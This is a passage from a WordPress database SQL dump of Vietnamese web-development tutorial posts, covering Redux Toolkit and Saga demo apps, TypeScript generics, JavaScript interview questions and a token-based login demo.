product_reducer,\n            },\n            middleware: (getDefaultMiddleware) =>\n                // Có 3 middleware ban đầu của Redux-Saga (mặc định là true) (chưa test đc chức năng serializableCheck)\n                getDefaultMiddleware({\n                    thunk: true,\n                    serializableCheck: true,\n                    immutableCheck: true,\n                }).concat(sagaMiddleware),   //sài thêm \"sagaMiddleware\"\n            devTools: true, //default là true (có dùng devTools không)\n        })\n\n        // Khởi chạy rootSaga sau khi được mount vào Store \n        sagaMiddleware.run(rootSaga);\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function App(props) {\n            //Sử dụng useSelector và useDispatch sẽ tiện hơn rất nhiều so với phải dùng HOC\n            const useAppDispatch = ReactRedux.useDispatch();\n            const useAppSelector = ReactRedux.useSelector;\n\n            const listStudent = useAppSelector(state => state.listStudent);\n            const dispatch_saveStudent = (student) => useAppDispatch(action_saveStudent(student));\n            const dispatch_deleteStudent = (id) => useAppDispatch(action_deleteStudent(id));\n            // Đoạn dưới là dispatch 1 function (function này là 1 hàm bất đồng bộ, nó chạy xong rồi lại dispatch 1 hàm khác)\n            const dispatch_getStudentsOnline = (url) => useAppDispatch(getStudentsOnline(url));\n            const dispatch_saga_getStudents = (url) => useAppDispatch(action_saga_getStudents(url));\n\n            const [url_fakeStudent, setUrl_fakeStudent] = React.useState(\'https://jsonplaceholder.typicode.com/users\')\n            const [filterName, setFilterName] = React.useState(\'\');\n            const [student, setStudent] = React.useState({ username: \'\', email: \'\', id: \'\' });\n\n            const updateState_student = (e) => {\n                let newStudent = { ...student };\n                newStudent[e.target.name] = e.target.value;\n                setStudent(newStudent)\n            };\n\n            const onSaveStudent = (e) => {\n                if (!student.username || !student.email) return;\n                dispatch_saveStudent(student);\n                setStudent({ username: \'\', email: \'\', id: \'\' });\n            };\n\n            return (\n                <div>\n                    <button onClick={() => { setStudent({ username: \'\', email: \'\', id: \'\' }) }}>New Student</button> <br />\n                    <input type=\"text\" placeholder=\"username\" name=\"username\"\n                        value={student.username}\n                        onChange={updateState_student}\n                    /> <br />\n                    <input\n                        type=\"text\" placeholder=\"email\" name=\"email\"\n                        value={student.email}\n                        onChange={updateState_student}\n                    /> <br />\n                    <button onClick={onSaveStudent}>\n                        {student.id ? \'Update Student\' : \'Add Student\'}\n                    </button> <br /> <br />\n                    <input type=\"text\" placeholder=\"Search ...\" name=\"txtFilterName\"\n                        value={filterName}\n                        onChange={(e) => { setFilterName(e.target.value) }}\n                    />\n                    <table>\n                        <thead>\n                            <tr>\n                                <th>#</th>\n                                <th>Username</th>\n                                <th>Email</th>\n                                <th>Action</th>\n                            </tr>\n                        </thead>\n                        <tbody>\n                            {\n                                listStudent.data\n                                    .filter((item) => item.username.includes(filterName))\n                                    .map((item, index) => {\n                                        return (\n                                            <tr key={item.id}>\n                                                <td>{index}</td>\n                                                <td>{item.username}</td>\n                                                <td>{item.email}</td>\n                                                <td>\n                                                    <button onClick={(e) => { setStudent({ ...item }) }}>Sửa</button>\n                                                    <button onClick={(e) => { dispatch_deleteStudent(item.id) }}>Xóa</button>\n                                                </td>\n                                            </tr>\n                                        );\n                                    })\n                            }\n                        </tbody>\n                    </table><br />\n                    <select value={url_fakeStudent} onChange={(e) => { setUrl_fakeStudent(e.target.value) }}>\n                        <option value=\"https://jsonplaceholder.typicode.com/users\">https://jsonplaceholder.typicode.com/users</option>\n                        <option value=\"https://fakestoreapi.com/users?limit=10\">https://fakestoreapi.com/users?limit=10</option>\n                    </select><br/>\n                    <button onClick={e => { dispatch_getStudentsOnline(url_fakeStudent) }}>Get Student Online</button>  <br/>\n                    <button onClick={e => { dispatch_saga_getStudents(url_fakeStudent) }}>Get Student Saga</button>\n                    {listStudent.loading && <img src=\"https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif\" width=\"12px\" />}\n                </div>\n            );\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-CRUD: 5. ListStudent with Redux-Toolkit, Redux-Saga', '', 'publish', 'open', 'open', '', 'demo-crud-5-liststudent-with-redux-toolkit-redux-saga', '', '', '2021-06-29 05:00:31', '2021-06-28 22:00:31', '', 0, 'https://duycode.com/?p=1662', 0, 'post', '', 0),
(1664, 1, '2021-06-28 07:00:16', '2021-06-28 00:00:16', '<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>Demo app Count with use ReactJS and Redux</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js\"></script>\n\n    <!-- =========== slices/count_slice.js =========== -->\n    <script>\n        //1. Khai báo Slice: Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn\n        const countSlice = RTK.createSlice({\n            name: \'count\',\n            initialState: { amount: 1 },\n            reducers: {\n                action_increment(state, action) {\n                    state.amount += action.payload.amount;\n                },\n                action_decrement(state, action) {\n                    state.amount -= action.payload.amount;\n                },\n            }\n        });\n        // Export ra các actions, reducer tương ứng :D\n        const { action_increment, action_decrement } = countSlice.actions;\n        const countReducer = countSlice.reducer;\n    </script>\n\n    <!-- =========== src/api/count.js =========== -->\n    <script>\n        // Important: Middleware: Các action dạng bất đồng bộ thì sẽ xử lý tại đây\n        // TH này, giải quyết middleware bằng \"redux-thunk\" (đã tự động cài ở RTK)\n        // Tại button, ta dispatch 1 function có dạng trả về là 1 async function\n        // async function này có nhiệm vụ giải quyết các promise, sau đó mới dispatch action thật\n        const increment_async = (payload) => async (dispatch) => {\n            let promise = (data) => new Promise((resolve, reject) => {\n                setTimeout(() => {\n                    resolve(data);\n                }, 1000);\n            })\n            let response = await promise(payload);\n            dispatch(action_increment(response));\n        }\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        //2. Khai báo store bằng \"configureStore\": tất cả các Reducer trong store ở dưới đây\n        //configureStore: mặc định đã có \"thunk\"\n        const store = RTK.configureStore({\n            reducer: {\n                count: countReducer\n            }\n        })\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function App(props) {\n            //3. Dùng useSelector và useDispatch để làm việc với store của Redux\n            const count = ReactRedux.useSelector(state => state.count);\n            const dispatch = ReactRedux.useDispatch();\n            return (\n                <div>\n                    <p>{count.amount}</p>\n                    <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>\n                    <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button><br />\n                    <button onClick={() => { dispatch(increment_async({ amount: 1 })) }}>Increase Async</button>\n                </div>\n            )\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //4. Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-Count: 7. use Redux-Toolkit, Thunk middleware', '', 'publish', 'open', 'open', '', 'demo-count-7-use-redux-toolkit-thunk-middleware', '', '', '2021-06-28 07:00:16', '2021-06-28 00:00:16', '', 0, 'https://duycode.com/?p=1664', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1666, 1, '2021-06-28 08:00:56', '2021-06-28 01:00:56', '<pre>\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    \n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <title>Demo app Count with use ReactJS and Redux</title>\n    </head>\n    \n    <body>\n        <div id=\"root\"></div>\n        <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n        <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n        <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n    \n        <script src=\"https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js\"></script>\n        <script src=\"https://unpkg.com/redux-saga@1.1.3/dist/redux-saga.umd.js\"></script>\n    \n        <!-- =========== slices/count_slice.js =========== -->\n        <script>\n            //1. Khai báo Slice: Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn\n            const countSlice = RTK.createSlice({\n                name: \'count\',\n                initialState: { number: 1, loading: false },\n                reducers: {\n                    action_increment(state, action) {\n                        state.number += action.payload.amount;\n                    },\n                    action_decrement(state, action) {\n                        state.number -= action.payload.amount;\n                    },\n                    action_increment_saga_request(state, action) {\n                        state.loading = true;\n                    },\n                    action_increment_saga_success(state, action) {\n                        state.loading = false;\n                        state.number += action.payload.amount;\n                    },\n                }\n            });\n            // Export ra các actions, reducer tương ứng :D\n            const countReducer = countSlice.reducer;\n            const {\n                action_increment,\n                action_decrement,\n                action_increment_saga_request,\n                action_increment_saga_success\n            } = countSlice.actions;\n\n        </script>\n    \n        <!-- =========== src/api/count.js =========== -->\n        <script>\n            // Thunk - Middleware: Các action dạng bất đồng bộ thì sẽ xử lý tại đây\n            // Tại button, ta dispatch 1 function có dạng trả về là 1 async function\n            // async function này có nhiệm vụ giải quyết các promise, sau đó mới dispatch action thật\n            const increment_async = (payload) => async (dispatch) => {\n                let promise = (data) => new Promise((resolve, reject) => {\n                    setTimeout(() => {\n                        resolve(data);\n                    }, 1000);\n                })\n                let response = await promise(payload);\n                dispatch(action_increment(response));\n            }\n        </script>\n    \n        <!-- =========== src/middleware/saga.js =========== -->\n        <script>\n            // Saga.0: Ta giả lập 1 cái promise như sau:\n            const promise_count = (n) => new Promise((resolve, reject) => {\n                setTimeout(() => {\n                    resolve(n);\n                }, 2000);\n            })\n\n            // //Saga.5: Khai báo Saga worker: Những thằng handle saga còn lại có nhiệm vụ worker\n            const handle_increment_saga = function* (action) {\n                let response = yield promise_count(action.payload);\n                // Có thể delay bằng cách\n                // yield delay(2000);\n                // put ==> kích hoạt action :D, đi hết middleware 1 vòng rồi đó\n                yield ReduxSaga.effects.put(action_increment_saga_success(response))\n            }\n\n            //Saga.4: Khai báo Saga watcher: Thằng này chỉ có nhiệm vụ đón các action và giao nhiệm vụ cho các saga khác\n            const countSaga = function* () {\n                //Các effect creator hay gặp: takeEvery, takeLatest, takeLeading\n                yield ReduxSaga.effects.takeEvery(action_increment_saga_request().type, handle_increment_saga)\n            }\n            const otherSaga = function* () {\n                // console.log(\"Other saga\");\n                // RootSaga sẽ khởi chạy tất cả các saga khác lần đầu tiên khi khởi động\n            }\n            // Saga.3: Khai báo rootSaga\n            const rootSaga = function* () {\n                yield ReduxSaga.effects.all([countSaga(), otherSaga()])\n            }\n        </script>\n    \n        <!-- =========== src/store.js =========== -->\n        <script type=\"text/babel\">\n            // 2. Saga.1: Khai báo sagaMiddleware (xem thêm trên trang chủ cách khai báo khi sử dụng npm install)\n            const sagaMiddleware = ReduxSaga.default();\n            // Saga.2: Khai báo store sử dụng middleware Saga\n            //configureStore: mặc định đã có \"thunk\"\n            const store = RTK.configureStore({\n                reducer: {\n                    count: countReducer\n                },\n                middleware: getDefaultMiddleware => getDefaultMiddleware().concat(sagaMiddleware),   //sài thêm \"sagaMiddleware\"\n            })\n\n            // Saga.3: Khởi chạy rootSaga sau khi được mount vào Store \n            sagaMiddleware.run(rootSaga);\n        </script>\n    \n        <!-- =========== components/App.js =========== -->\n        <script type=\"text/babel\">\n            function App(props) {\n                //3. Dùng useSelector và useDispatch để làm việc với store của Redux\n                const count = ReactRedux.useSelector(state => state.count);\n                const dispatch = ReactRedux.useDispatch();\n                return (\n                    <div>\n                        <p>\n                            {count.number}\n                            {count.loading && <img src=\"https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif\" width=\"12px\" />}\n                        </p>\n                        <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>\n                        <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button><br />\n                        <button onClick={() => { dispatch(increment_async({ amount: 1 })) }}>Increase Thunk</button><br />\n                        <button onClick={() => { dispatch(action_increment_saga_request({ amount: 1 })) }}>Increase Saga takeEvery</button>\n                    </div>\n                )\n            }\n        </script>\n    \n        <!-- =========== src/index.js =========== -->\n        <script type=\"text/babel\">\n            //4. Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n            const Provider = ReactRedux.Provider;\n            ReactDOM.render(\n                <Provider store={store}>\n                    <App />\n                </Provider>,\n                document.getElementById(\'root\')\n            );\n        </script>\n    </body>\n    \n    </html>\n    </pre>', 'Demo-Count: 8. use Redux-Toolkit, Redux-Saga: Effect Creator', '', 'publish', 'open', 'open', '', 'demo-count-8-use-redux-toolkit-redux-saga-effect-creator', '', '', '2021-06-28 08:00:56', '2021-06-28 01:00:56', '', 0, 'https://duycode.com/?p=1666', 0, 'post', '', 0),
(1679, 1, '2021-08-03 13:09:03', '2021-08-03 06:09:03', '<h2>1. Fake Data</h2>\nCác thư viện fake thường dùng: <a href=\"https://github.com/Marak/faker.js\" rel=\"noopener\" target=\"_blank\">https://github.com/Marak/faker.js</a> \n<h3>1.2. Fake API</h3>\n<a href=\"https://reqres.in/\" rel=\"noopener\" target=\"_blank\">https://reqres.in/</a>\n<a href=\"https://fakestoreapi.com/\" rel=\"noopener\" target=\"_blank\">https://fakestoreapi.com/</a>\n<a href=\"https://mockapi.io/\" rel=\"noopener\" target=\"_blank\">https://mockapi.io/</a>\n<a href=\"https://jsonplaceholder.typicode.com/\" rel=\"noopener\" target=\"_blank\">https://jsonplaceholder.typicode.com/</a>\n\n<h3>1.3. Fake Image</h3>\n<a href=\"https://picsum.photos/\" rel=\"noopener\" target=\"_blank\">https://picsum.photos/</a>\n<a href=\"https://loremflickr.com/\" rel=\"noopener\" target=\"_blank\">https://loremflickr.com/</a>\n\n\n<h2>Host server</h2>\n1. Github Page\n2. Firebase\n3. Vercel\n<a href=\"https://vercel.com/\" rel=\"noopener\" target=\"_blank\">https://vercel.com/</a>\n- Publich web lên vercel bằng đúng 1 dòng lệnh\n<blockquote>npx now --public</blockquote>\n4. Surge.sh\n<a href=\"https://surge.sh/\" rel=\"noopener\" target=\"_blank\">https://surge.sh/</a>\n5. Netlify\n6. Heroku\n7. Ngrok\n\n<h2>3. Đưa local host lên server</h2>\n- ngrok\n- localtunnel', 'Các thư viện Online quan trọng', '', 'publish', 'open', 'open', '', 'cac-thu-vien-online-quan-trong', '', '', '2021-08-03 13:09:03', '2021-08-03 06:09:03', '', 0, 'https://duycode.com/?p=1679', 0, 'post', '', 0),
(1712, 1, '2021-08-09 09:41:17', '2021-08-09 02:41:17', '<h2>1 số cú pháp cần nhớ</h2>\r\nUnion type | string | number;\r\nIntersection Types &\r\nOptional notation ?\r\nAngle brackets: <>\r\nNullish coalescing operator: ??\r\nGeneric type\r\nDecorators: @\r\n\r\n<h2>Cài đặt</h2>\r\n<blockquote>\r\nnpm i -g typescript\r\nnpx tsc --init\r\n</blockquote>\r\n<pre>\r\nlet myname = \"Harry\"\r\n\r\n//Genenric\r\nconst gener_1 = <T>(arr: Array<T>) => arr[0];\r\nconst gener_2 = <X, Y>(x: X, y: Y) => [x, y];\r\nconst gener_3 = <X, Y>(x: X, y: Y): [X, Y] => [x, y];\r\nconst gener_4 = <X, Y = number>(x: X, y: Y): [X, Y] => [x, y];\r\n\r\nconst run_gener_1 = gener_1([1, 2, 3]);\r\nconst run_gener_2 = gener_2(123, \"abc\");\r\nconst run_gener_3 = gener_3(123, \"abc\");\r\nconst run_gener_31 = gener_3<number | boolean, string>(123, \"abc\");\r\nconst run_gener_4 = gener_4<string | null>(\"abc\", 123);\r\n\r\n//Generic Extends \r\nconst gener_5 = (obj: { firstName: string; lastName: string }) => ({\r\n    ...obj,\r\n    fullname: `${obj.firstName} ${obj.lastName}`\r\n})\r\nconst gener_6 = <T extends { firstName: string; lastName: string }>(obj: T) => ({\r\n    ...obj,\r\n    fullname: `${obj.firstName} ${obj.lastName}`\r\n})\r\nconst gener_7_error = (employee: object) => ({\r\n    ...employee,\r\n    uid: Math.floor(Math.random() * 100),\r\n})\r\nconst gener_8_fix = <T>(employee: T) => ({\r\n    ...employee,\r\n    uid: Math.floor(Math.random() * 100),\r\n})\r\nconst run_gener_5 = gener_5({ firstName: \"John\", lastName: \"Parker\" });\r\nconst run_gener_6 = gener_6({ firstName: \"John\", lastName: \"Parker\", age: 30 });\r\nconst run_gener_7 = gener_7_error({ firstName: \"John\", lastName: \"Parker\", age: 30 });\r\nconst run_gener_8 = gener_8_fix({ firstName: \"John\", lastName: \"Parker\", age: 30 });\r\n\r\n\r\n//Generic Interface\r\ninterface Resource<T> {\r\n    uid: number,\r\n    name: string,\r\n    data: T,\r\n}\r\n\r\ntype NumberResource = Resource<number[]>\r\n\r\nconst res1: Resource<object> = {\r\n    uid: 1,\r\n    name: \"Jack\",\r\n    data: { order: 2 }\r\n}\r\nconst res2: Resource<string[]> = {\r\n    uid: 1,\r\n    name: \"Jack\",\r\n    data: [\"John\", \"Jack\"]\r\n}\r\nconst res3: NumberResource = {\r\n    uid: 1,\r\n    name: \"Jack\",\r\n    data: [12, 34]\r\n}\r\n\r\n</pre>\r\n', 'Typescripts căn bản', '', 'publish', 'open', 'open', '', 'typescripts-can-ban', '', '', '2022-07-01 10:58:22', '2022-07-01 03:58:22', '', 0, 'https://duycode.com/?p=1712', 0, 'post', '', 0),
(1716, 1, '2021-08-10 19:30:04', '2021-08-10 12:30:04', '<h2>1. Cơ bản</h2>\r\n<details>\r\n<summary>Câu 1. Phân biệt var, let, const và Phân loại scope ?</summary>\r\nCó 3 loại scope:\r\n- Block scope - xuất hiện từ ES6\r\n- Function scope \r\n- Global scope\r\n\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>var</td>\r\n<td>let</td>\r\n<td>const</td>\r\n</tr>\r\n<tr>\r\n<td>Xuất hiện</td>\r\n<td>Trước ES6</td>\r\n<td>Từ ES6</td>\r\n<td>Từ ES6</td>\r\n</tr>\r\n<tr>\r\n<td>Khai b&aacute;o lại</td>\r\n<td>c&oacute;</td>\r\n<td>kh&ocirc;ng</td>\r\n<td>kh&ocirc;ng</td>\r\n</tr>\r\n<tr>\r\n<td>Tham chiếu gi&aacute; trị kh&aacute;c</td>\r\n<td>c&oacute;</td>\r\n<td>c&oacute;</td>\r\n<td>kh&ocirc;ng</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Hoisting</strong></td>\r\n<td>c&oacute;</td>\r\n<td>kh&ocirc;ng</td>\r\n<td>kh&ocirc;ng</td>\r\n</tr>\r\n<tr>\r\n<td><strong>Scope</strong></td>\r\n<td>function scope</td>\r\n<td>block scope</td>\r\n<td>block scope</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</details>\r\n\r\n<details>\r\n<summary>Câu 2. Các kiểu dữ liệu trong JS. Phân biệt các giá trị falsy</summary>\r\n1. Có 6 kiểu dữ liệu (Data Types) nguyên thủy (primitives): undefined, Boolean, Number, BigInt, String, Symbol\r\n2. Có 2 kiểu cấu trúc (Structural Types): Object, Function\r\n3. Cấu trúc gốc nguyên thủy (Structural Root Primitive): null (typeof null = \"object\")\r\n\r\n<strong>Phân biệt các giá trị falsy</strong>\r\n1. Các giá trị falsy là các giá trị khi phủ định được trả về kết quả \"true\"\r\n<p>C&aacute;c gi&aacute; trị falsy</p>\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>typeof</td>\r\n<td>&Yacute; nghĩa</td>\r\n<td>So s&aacute;nh</td>\r\n</tr>\r\n<tr>\r\n<td>undefined</td>\r\n<td>\r\n<p>\'undefined\'</p>\r\n</td>\r\n<td>Chưa được khai b&aacute;o, hoặc đ&atilde; khai b&aacute;o nhưng chưa g&aacute;n gi&aacute; trị</td>\r\n<td rowspan=\"6\">\r\n<p>-&nbsp;NaN kh&aacute;c mọi thứ: NaN == NaN // false,&nbsp; NaN&nbsp;=== NaN&nbsp; &nbsp;//false<br /><br /></p>\r\n<p>-&nbsp;Nh&oacute;m undefined v&agrave; null bằng nhau:&nbsp;null == undefined&nbsp; &nbsp;//true , đương nhi&ecirc;n&nbsp;null === undefined&nbsp; //false</p>\r\n<p><span class=\"hljs-literal\">-&nbsp;Nh&oacute;m c&ograve;n lại bằng nhau: 0 == false == \"\", đương nhi&ecirc;n so s&aacute;nh === // false<br /><br /></span></p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>null</td>\r\n<td>\"object\"</td>\r\n<td>G&aacute;n gi&aacute; trị null</td>\r\n</tr>\r\n<tr>\r\n<td>false</td>\r\n<td>\r\n<p>\"boolean\"</p>\r\n</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>NaN</td>\r\n<td>\r\n<p>\"number\"</p>\r\n</td>\r\n<td>\r\n<p><span class=\"hljs-literal\">Kh&ocirc;ng thể trả về 1 số cụ thể, Vd: 1/\"haha\"</span></p>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>0</td>\r\n<td>\r\n<p>\"number\"</p>\r\n</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>\"\"</td>\r\n<td>\r\n<p>\"string\"</p>\r\n</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>Một số gi&aacute; trị trusthy đặc biệt:&nbsp;[], {},&nbsp;Infinity (khi 1 ph&eacute;p chia cho 0)</p>\r\n<p>Đặc biệt hơn</p>\r\n<p>0 == [] // true&nbsp; -----&gt; [] vẫn l&agrave; trusthy nh&eacute; :V</p>\r\n<p>0 == {} // false</p>\r\n</details>\r\n\r\n<details>\r\n<summary>Câu 3: Những tính năng mới trong ES6</summary>\r\n1. let và const. \r\n2. template strings\r\n3. Object\r\n- destructuring, rest: VD: {destructurin, ...rest} = obj\r\n- spread: ...[array]\r\n- Literals object (khai báo rút gọn)\r\n- class\r\n4. Function\r\n- default parameter\r\n- arrow functions\r\n- promise\r\n- function generator: yield\r\n5. module es6: export, import\r\n</details>\r\n\r\n<details>\r\n<summary>Câu 4: Hiểu thế nào về Call stack, event loop, callback, JS engine</summary>\r\n<a href=\"http://latentflip.com/loupe/\" rel=\"noopener\" target=\"_blank\">http://latentflip.com/loupe/</a>\r\n<img src=\"https://felixgerschau.com/static/79486d91b22a7c1b4044fce88a4cae20/5a190/js-event-loop-explained.png\" />\r\n<strong>1. JS Engine và V8 Engine là gì?</strong>\r\n- JS engine là 1 công cụ có khả năng biên dịch và thông dịch JS ra mã máy\r\n- JS engine có 2 thành phần chính: \'Memory Heap\' và \'Call Stack\'\r\n- AJAX, setTimeout, DOM không nằm trong JS Engine\r\n- V8 engine là một JS Engine có mặt ở 2 công cụ lớn nhất hiện nay: browser (Chrome), nodejs\r\n- Một số Engine khác: SpiderMonkey (Firefox), JavaScriptCore (Safari)\r\n\r\n<strong>2. JS Runtime là gì</strong>\r\n- Browser\'s JS runtime Enviroment bao gồm: JS Engine + công cụ của Browser cung cấp: WebAPIs, event loop, callback queue (chạy trên 1 thread riêng)\r\n- Node\'s JS runtime Enviroment bao gồm: JS Engine + + công cụ của NodeJS cung cấp: C++ APIs, event loop và callback được implement bằng C++\r\n- Các bộ cung cấp đó được chạy trên 1 thread riêng và được bảo trợ bỏi concurrency\r\n\r\n<strong>3. Event loop là gì</strong>\r\n- Event loop có nhiệm vụ đợi cho Call Stack rỗng, rồi soi xem Callback Queue có gì không, nếu có thì bốc cái đầu tiên bỏ vào CS để chạy\r\n\r\n<strong>4. render() là gì</strong>\r\n- Browser không thể gọi render() nếu có code JS cần chạy trong CallStack. Kiểu như tự nó là async callback vậy, phải đợi cho CallStack rỗng mới chạy được.\r\n- Chỉ khác một chút là render() được ưu tiên hơn so với các callback thông thường. \r\n- Cứ mỗi 16ms (với chỉ số lý tưởng 60fps), một lời gọi render() sẽ được đưa vào hàng đợi và đến khi CS rỗng thì mới được thực thi.\r\n- Nên nếu bạn block CallStack quá lâu thì UI sẽ bị đơ, user chẳng thể click lên button hay edit text được nữa\r\n</details>\r\n\r\n\r\n\r\n', 'Câu hỏi Javascript', '', 'publish', 'open', 'open', '', 'cau-hoi-javascript', '', '', '2022-08-16 00:01:42', '2022-08-16 00:01:42', '', 0, 'https://duycode.com/?p=1716', 0, 'post', '', 0),
(1724, 1, '2021-06-30 01:00:42', '2021-06-29 18:00:42', '<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n    <style>\n        table {\n            border-collapse: collapse;\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js\"></script>\n\n\n    <!-- =========== slices/auth_slice.js =========== -->\n    <script>\n        const authSlice = RTK.createSlice({\n            name: \'authSlice\',\n            initialState: {\n                info: {},\n                token: { accessToken: null, expirationTime: null },\n                loading: false\n            },\n            reducers: {\n                action_loginRequest(state, action) {\n                    state.loading = true;\n                },\n                action_loginSuccess(state, action) {\n                    state.token = action.payload;\n                    state.loading = false;\n                },\n                action_logout(state, action) {\n                    state.token = {};\n                    state.info = {};\n                },\n                action_getInfoRequest(state, action) {\n                    state.loading = true;\n                },\n                action_setInfoUser(state, action) {\n                    state.info = {\n                        name: action.payload.name,\n                        phone: action.payload.phone,\n                    }\n                    state.loading = false;\n                }\n            }\n        })\n\n        const auth_reducer = authSlice.reducer;\n        const { action_loginRequest, action_loginSuccess, action_logout, action_getInfoRequest, action_setInfoUser } = authSlice.actions;\n    </script>\n\n    <!-- =========== src/api/authAPI =========== -->\n    <script type=\"text/babel\">\n        //Đăng nhập chỉ để lấy token\n        const api_login = ({ username, password }) => async (dispatch) => {\n            try {\n                dispatch(action_loginRequest());\n                let url = \"https://learn-api.jmaster.io:8443/api/login\";\n                let config = {\n                    method: \'POST\',\n                    headers: new Headers({\n                        \'Content-Type\': \"application/x-www-form-urlencoded\",\n                        \'Cookie\': \"\",\n                    }),\n                    body: new URLSearchParams({\n                        \'username\': username,\n                        \'password\': password,\n                    }),\n                    redirect: \'follow\'\n                };\n                let response = await fetch(url, config);\n                let responseJSON = await response.json();\n                dispatch(action_loginSuccess(responseJSON));\n            } catch (err) {\n                console.log(err);\n            }\n        }\n\n        //Dùng token để get thông tin user\n        const api_getUser = (token) => async (dispatch) => {\n            try {\n                dispatch(action_getInfoRequest());\n                let url = \'https://learn-api.jmaster.io:8443/api/member/me\';\n                let config = {\n                    method: \'GET\',\n                    headers: new Headers({\n                        \'Authorization\': \"Bearer \" + token,\n                        \'Content-Type\': \"application/x-www-form-urlencoded\",\n                        \'Cookie\': \"\",\n                    }),\n                    redirect: \'follow\'\n                };\n\n                let response = await fetch(url, config);\n                let responseJSON = await response.json();\n                dispatch(action_setInfoUser(responseJSON));\n            } catch (err) {\n                console.log(err);\n            }\n        }\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        const store = RTK.configureStore({\n            reducer: {\n                auth: auth_reducer,\n            }\n        })\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function Login(props) {\n            const auth = ReactRedux.useSelector(state => state.auth);\n            const dispatch = ReactRedux.useDispatch();\n\n            const [username, setUsername] = 